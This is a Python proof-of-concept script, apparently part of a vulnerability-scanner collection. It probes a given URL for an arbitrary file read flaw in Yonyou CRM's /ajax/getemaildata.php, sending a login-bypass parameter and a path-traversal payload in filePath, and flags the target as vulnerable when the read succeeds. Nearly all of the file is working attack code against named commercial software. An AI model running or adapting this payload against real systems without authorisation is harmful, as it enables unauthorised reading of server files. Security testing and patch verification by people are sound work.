#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友CRM系统任意文件读取
referer: http://wooyun.org/bugs/wooyun-2015-0137503
author: Lucifer
description: 文件/ajax/getemaildata.php中,参数filePath未过滤存在任意文件读取。
'''
import sys
import requests
import warnings
from termcolor import cprint

class yonyou_getemaildata_fileread_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ajax/getemaildata.php?DontCheckLogin=1&filePath=../version.txt"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"patch" in req.text:
                cprint("[+]存在用友CRM系统任意文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = yonyou_getemaildata_fileread_BaseVerify(sys.argv[1])
    testVuln.run()